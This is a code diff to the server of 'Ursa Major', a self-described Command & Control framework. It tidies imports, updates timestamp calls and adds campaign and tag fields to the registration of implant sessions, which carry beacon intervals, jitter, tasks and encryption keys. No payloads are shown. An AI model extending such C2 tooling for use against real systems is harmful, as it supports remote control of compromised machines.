@@ -19,31 +19,36 @@ Run:
     python3 major/server.py [--port 8443] [--host 0.0.0.0]
 """
 
-import sys
-import os
-import json
-import time
-import base64
-import threading
 import argparse
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
-from datetime import datetime
+import base64
+import json
+import os
+import sys
+import threading
+import time
+from datetime import UTC, datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse
 
 # Add parent to path for imports
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from major.db import (
-    init_db, create_session, update_session_checkin, get_session,
-    list_sessions, kill_session, update_session_info,
-    create_task, get_pending_tasks, complete_task, get_task, list_tasks,
-    store_file, get_file, list_files,
-    create_listener, update_listener_status, list_listeners, get_listener,
-    log_event, get_events
-)
-from major.crypto import UrsaCrypto, generate_session_key
 from major.config import get_config, reload_config
-
+from major.crypto import UrsaCrypto, generate_session_key
+from major.db import (
+    complete_task,
+    create_session,
+    get_file,
+    get_pending_tasks,
+    get_session,
+    get_task,
+    init_db,
+    list_sessions,
+    log_event,
+    store_file,
+    update_session_checkin,
+    update_session_info,
+)
 
 # ── Configuration (loaded from ursa.yaml with defaults) ──
 
@@ -102,7 +107,7 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
             self._send_json({
                 "status": "ok",
                 "version": "1.0",
-                "timestamp": datetime.utcnow().isoformat()
+                "timestamp": datetime.now(UTC).isoformat()
             })
 
         elif path.startswith("/download/"):
@@ -160,6 +165,8 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
             arch=body.get("arch", "unknown"),
             pid=body.get("pid", 0),
             process_name=body.get("process", "unknown"),
+            campaign=body.get("campaign", ""),
+            tags=body.get("tags", ""),
             encryption_key=session_key,
             beacon_interval=body.get("interval", 5),
             jitter=body.get("jitter", 0.1),
@@ -363,7 +370,7 @@ def start_server(host=DEFAULT_HOST, port=DEFAULT_PORT):
     _log("  URSA MAJOR — Command & Control Server")
     _log("=" * 55)
     _log(f"  Listening: {host}:{port}")
-    _log(f"  Protocol:  HTTP")
+    _log("  Protocol:  HTTP")
     _log(f"  Database:  {os.path.abspath(os.path.join(os.path.dirname(__file__), 'ursa.db'))}")
     _log("")
     _log("  Endpoints:")
